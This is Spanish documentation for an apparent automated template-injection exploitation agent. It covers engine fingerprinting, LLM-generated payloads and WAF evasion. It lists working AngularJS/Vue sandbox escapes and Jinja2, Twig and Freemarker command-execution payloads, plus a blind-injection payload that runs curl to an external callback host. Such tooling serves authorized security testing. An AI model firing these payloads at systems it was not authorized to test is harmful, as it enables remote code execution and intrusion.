# CSTIAgent - El Especialista en Template Injection

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-94 (Code Injection) / CWE-1336 (Improper Neutralization of Special Elements used in a Template Engine)  
> **Clase**: `bugtrace.agents.exploitation.csti_agent.CSTIAgent`  
> **Archivo**: `bugtrace/agents/exploitation/csti_agent.py`

---

## Overview

**CSTIAgent** es el especialista encargado de detectar y explotar vulnerabilidades de **Template Injection**, tanto **Client-Side (CSTI)** como **Server-Side (SSTI)**.

Aunque su nombre original es CSTIAgent, en la versión V2 ha evolucionado para convertirse en un **Template Injection Specialist** completo, capaz de fingerprints y explotar desde frameworks modernos de JavaScript (Angular, Vue) hasta motores de plantillas tradicionales de backend (Jinja2, Twig, Freemarker).

### 🎯 **Capacidades Principales**

| Capability | Descripción | Motores Soportados |
|------------|-------------|--------------------|
| **CSTI (Client-Side)** | Ejecución de JS en el navegador via template directives | **AngularJS** (1.x bypasses), **Angular** (2+), **Vue.js** |
| **SSTI (Server-Side)** | Ejecución de código (RCE) en el servidor via template engine | **Jinja2** (Python), **Twig** (PHP), **Freemarker** (Java), **Velocity**, **Mako**, **ERB** (Ruby) |
| **Engine Fingerprinting** | Identificación automática del motor en uso | Detección basada en patrones (`ng-app`, `v-if`) y respuestas a probes (`{{7*7}}` -> `49`) |
| **Sandbox Escapes** | Técnicas avanzadas para escapar del sandbox del motor | Bypasses conocidos para Angular 1.x, Jinja2 filters, etc. |
| **Blind Injection (OOB)** | Detección de SSTI ciego mediante callbacks externos | Integración nativa con **Interactsh** |
| **WAF Bypass** | Evasión de filtros de seguridad | **Q-Learning** adaptable con codificación (Unicode, HTML Entities, URL) |

---

## Arquitectura del Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│              CSTI/SSTI AGENT WORKFLOW (V2 Engine)               │
└─────────────────────────────────────────────────────────────────┘

Input: URL con parámetros sospechosos + HTML Context
│
▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 1: ENGINE FINGERPRINTING & WAF DETECTION                  │
├────────────────────────────────────────────────────────────────┤
│  🔍 Análisis Estático y Dinámico                               │
│  • Busca firmas en HTML: `ng-app`, `v-model`, `data-reactroot` │
│  • Detecta WAF activo (Cloudflare, AWS WAF, etc.)              │
│  • Envía probes de identificación (Math probes):               │
│    - {{7*7}} -> 49 (Universal)                                 │
│    - ${7*7} -> 49 (Jinja2/Freemarker)                          │
│    - <%= 7*7 %> -> 49 (ERB)                                    │
│                                                                 │
│  Output: Detected Engines (e.g., ["angular", "jinja2"])        │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 2: STRATEGY SELECTION & PAYLOAD GENERATION                │
├────────────────────────────────────────────────────────────────┤
│  🎯 Selección de Estrategia                                    │
│                                                                 │
│  A) Targeted Probe (Si Engine Detectado):                      │
│     • Carga payloads específicos de la librería interna        │
│     • Aplica técnicas de encoding si hay WAF                   │
│                                                                 │
│  B) Universal Polyglots (Si Engine Desconocido):               │
│     • Payloads híbridos que funcionan en múltiples motores     │
│     • Omni-Probe: `{{7*7}}${7*7}<%= 7*7 %>`                    │
│                                                                 │
│  C) LLM Smart Analysis (Context-Aware):                        │
│     • LLM analiza el HTML para generar payloads contextuales   │
│     • Útil para versiones específicas o filtros custom         │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ STEP 3: EXPLOITATION & VERIFICATION                            │
├────────────────────────────────────────────────────────────────┤
│  ⚡ Ejecución de Ataques                                       │
│                                                                 │
│  1. CSTI (Client-Side):                                        │
│     • Inyecta payloads XSS/JS via template (e.g. constructor)  │
│     • Verifica si el JS se ejecuta (alert, fetch)              │
│     • Verifica evaluación aritmética (7*7=49)                  │
│                                                                 │
│  2. SSTI (Server-Side):                                        │
│     • Intenta leer configuración ({{config}})                  │
│     • Intenta ejecutar comandos (os.popen, sistema)            │
│     • Blind Check: Envía payload OOB a Interactsh              │
│                                                                 │
│  Output: CSTIFinding (CONFIRMED) con prueba de impacto         │
└────────────────────────────────────────────────────────────────┘
```

---

## Impact Tiering (Jerarquía de Victoria)

El agente clasifica el éxito del ataque basándose en el impacto logrado, deteniéndose si alcanza el máximo nivel de compromiso.

| Tier | Nivel | Descripción | Indicadores | Acción |
|------|-------|-------------|-------------|--------|
| **3** | **Critical (RCE)** | Ejecución de Comandos o Lectura de Archivos | Output de `id`, `whoami`, `/etc/passwd`. | **STOP IMMEDIATELY** (Victory) |
| **2** | **High (Internals)** | Acceso a objetos internos o configuración | Acceso a `__globals__`, `config`, `self`, secrets. | **STOP IMMEDIATELY** |
| **1** | **Medium (Eval)** | Evaluación de expresiones matemáticas | `{{7*7}}` renderizado como `49`. | Continuar para intentar escalar |
| **0** | **None** | No se detecta inyección | Payload reflejado tal cual o sanitizado. | Continuar con otros payloads |

---

## Payload Libraries

### 1. Client-Side (CSTI)

**AngularJS (1.x) Sandbox Bypasses**:
```javascript
// Constructor bypass clásico
{{constructor.constructor('alert(1)')()}}

// Bypass avanzado para filtros estrictos
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**Vue.js**:
```javascript
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
```

### 2. Server-Side (SSTI)

**Jinja2 (Python)**:
```python
{{config.items()}}
{{self.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP)**:
```php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

**Freemarker (Java)**:
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## Advanced Features

### 🧠 LLM Smart Analysis
Cuando los payloads estáticos fallan, el CSTIAgent utiliza un LLM (Claude/GPT) con el prompt `CSTI_SMART_ANALYSIS`.
- **Input**: Fragmento de HTML, parámetros, motores detectados.
- **Task**: Generar payloads precisos para el contexto específico (ej. dentro de un atributo, dentro de un script, filtros custom).
- **Output**: XML con payloads, motor objetivo y explicación.

### 🛡️ WAF Bypass con Q-Learning
El agente implementa un sistema de aprendizaje por refuerzo ligero (UCB1) para bypassear WAFs.
- Si detecta bloqueo (403/WAF response), prueba diferentes encodings (URL, Unicode, HTML entities).
- Aprende qué encoding funciona mejor contra el WAF específico del objetivo.

### 📡 Blind SSTI con Interactsh
Para casos donde el resultado no es visible (Blind SSTI), el agente inyecta payloads que provocan una petición externa.
- **Payload**: `{{config.__class__.__init__.__globals__['os'].popen('curl http://abc.oast.live').read()}}`
- **Verificación**: Consulta a `InteractshClient` para confirmar la recepción del callback.

---

## Configuración

```yaml
specialists:
  csti:
    enabled: true
    
    # Engine Detection
    auto_fingerprint: true
    
    # Strategies
    use_targeted_probes: true
    use_universal_probes: true
    use_llm_analysis: true
    use_oob_verification: true  # Interactsh
    
    # WAF
    waf_bypass_enabled: true
    
    # Limits
    max_payloads_per_param: 15
    timeout_per_probe: 5
```

---

*Última actualización: 2026-02-01 (V2 Engine)*
